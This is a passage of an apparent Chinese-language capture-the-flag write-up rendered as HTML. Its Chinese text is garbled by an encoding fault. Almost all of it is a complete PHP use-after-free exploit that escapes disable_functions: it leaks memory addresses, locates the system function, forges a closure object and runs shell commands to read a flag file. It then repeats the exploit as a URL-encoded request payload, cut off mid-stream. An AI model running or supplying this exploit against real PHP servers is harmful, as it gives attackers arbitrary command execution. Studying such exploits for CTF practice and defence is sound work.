class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">pwn</span>(<span class="string">&quot;ls /;cat /flag0.txt&quot;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>(); <span class="comment"># ;)</span></span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123; <span class="comment"># PHP &gt;= 7.4</span></span><br><span class="line">                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%c&#x27;</span>,<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%c&#x27;</span>,<span class="variable">$v</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"> </span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment"># str_shuffle prevents opcache string interning</span></span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; <span class="comment"># increase this value if UAF fails</span></span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); <span class="comment"># internal func handler</span></span><br><span class="line"> </span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹ç›´æ¥è´´ä¸€ä¸ª payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=%<span class="number">3</span>f%<span class="number">3</span>e%<span class="number">3</span>c%<span class="number">3</span>fphp%<span class="number">0</span>apwn(%<span class="number">22</span>ls+%<span class="number">2</span>f%<span class="number">3</span>bcat+%<span class="number">2</span>fflag0.txt%<span class="number">22</span>)%<span class="number">3</span>b%<span class="number">0</span>a%<span class="number">0</span>afunction+<span class="title function_ invoke__">pwn</span>(%<span class="number">24</span>cmd)+%<span class="number">7</span>b%<span class="number">0</span>a++++<span class="keyword">global</span>+%<span class="number">24</span>abc%<span class="number">2</span>c+%<span class="number">24</span>helper%<span class="number">2</span>c+%<span class="number">24</span>backtrace%<span class="number">3</span>b%<span class="number">0</span>a++++<span class="class"><span class="keyword">class</span>+<span class="title">Vuln</span>+%7<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">public</span>+%24<span class="title">a</span>%3<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">public</span>+<span class="title">function</span>+<span class="title">__destruct</span>()+%7<span class="title">b</span>+%0<span class="title">a</span>++++++++++++<span class="title">global</span>+%24<span class="title">backtrace</span>%3<span class="title">b</span>+%0<span class="title">a</span>++++++++++++<span class="title">unset</span>(%24<span class="title">this</span>-%3<span class="title">ea</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">backtrace</span>+%3<span class="title">d</span>+(<span class="title">new</span>+<span class="title">Exception</span>)-%3<span class="title">egetTrace</span>()%3<span class="title">b</span>+%23+%3<span class="title">b</span>)%0<span class="title">a</span>++++++++++++<span class="title">if</span>(!<span class="title">isset</span>(%24<span class="title">backtrace</span>%5<span class="title">b1</span>%5<span class="title">d</span>%5<span class="title">b</span>%27<span class="title">args</span>%27%5<span class="title">d</span>))+%7<span class="title">b</span>+%23+<span class="title">PHP</span>+%3<span class="title">e</span>%3<span class="title">d</span>+7.4%0<span class="title">a</span>++++++++++++++++%24<span class="title">backtrace</span>+%3<span class="title">d</span>+<span class="title">debug_backtrace</span>()%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%7<span class="title">d</span>%0<span class="title">a</span>++++++++%7<span class="title">d</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">class</span>+<span class="title">Helper</span>+%7<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">public</span>+%24<span class="title">a</span>%2<span class="title">c</span>+%24<span class="title">b</span>%2<span class="title">c</span>+%24<span class="title">c</span>%2<span class="title">c</span>+%24<span class="title">d</span>%3<span class="title">b</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">function</span>+<span class="title">str2ptr</span>(%26%24<span class="title">str</span>%2<span class="title">c</span>+%24<span class="title">p</span>+%3<span class="title">d</span>+0%2<span class="title">c</span>+%24<span class="title">s</span>+%3<span class="title">d</span>+8)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++%24<span class="title">address</span>+%3<span class="title">d</span>+0%3<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">for</span>(%24<span class="title">j</span>+%3<span class="title">d</span>+%24<span class="title">s</span>-1%3<span class="title">b</span>+%24<span class="title">j</span>+%3<span class="title">e</span>%3<span class="title">d</span>+0%3<span class="title">b</span>+%24<span class="title">j</span>--)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">address</span>+%3<span class="title">c</span>%3<span class="title">c</span>%3<span class="title">d</span>+8%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">address</span>+%7<span class="title">c</span>%3<span class="title">d</span>+<span class="title">ord</span>(%24<span class="title">str</span>%5<span class="title">b</span>%24<span class="title">p</span>%2<span class="title">b</span>%24<span class="title">j</span>%5<span class="title">d</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++++++%7<span class="title">d</span>%0<span class="title">a</span>++++++++<span class="title">return</span>+%24<span class="title">address</span>%3<span class="title">b</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">function</span>+<span class="title">ptr2str</span>(%24<span class="title">ptr</span>%2<span class="title">c</span>+%24<span class="title">m</span>+%3<span class="title">d</span>+8)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++%24<span class="title">out</span>+%3<span class="title">d</span>+%22%22%3<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">for</span>+(%24<span class="title">i</span>%3<span class="title">d0</span>%3<span class="title">b</span>+%24<span class="title">i</span>+%3<span class="title">c</span>+%24<span class="title">m</span>%3<span class="title">b</span>+%24<span class="title">i</span>%2<span class="title">b</span>%2<span class="title">b</span>)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">out</span>+.%3<span class="title">d</span>+<span class="title">sprintf</span>(%27%25<span class="title">c</span>%27%2<span class="title">c</span>%24<span class="title">ptr</span>+%26+0<span class="title">xff</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">ptr</span>+%3<span class="title">e</span>%3<span class="title">e</span>%3<span class="title">d</span>+8%3<span class="title">b</span>%0<span class="title">a</span>++++++++%7<span class="title">d</span>%0<span class="title">a</span>++++++++<span class="title">return</span>+%24<span class="title">out</span>%3<span class="title">b</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">function</span>+<span class="title">write</span>(%26%24<span class="title">str</span>%2<span class="title">c</span>+%24<span class="title">p</span>%2<span class="title">c</span>+%24<span class="title">v</span>%2<span class="title">c</span>+%24<span class="title">n</span>+%3<span class="title">d</span>+8)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++%24<span class="title">i</span>+%3<span class="title">d</span>+0%3<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">for</span>(%24<span class="title">i</span>+%3<span class="title">d</span>+0%3<span class="title">b</span>+%24<span class="title">i</span>+%3<span class="title">c</span>+%24<span class="title">n</span>%3<span class="title">b</span>+%24<span class="title">i</span>%2<span class="title">b</span>%2<span class="title">b</span>)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">str</span>%5<span class="title">b</span>%24<span class="title">p</span>+%2<span class="title">b</span>+%24<span class="title">i</span>%5<span class="title">d</span>+%3<span class="title">d</span>+<span class="title">sprintf</span>(%27%25<span class="title">c</span>%27%2<span 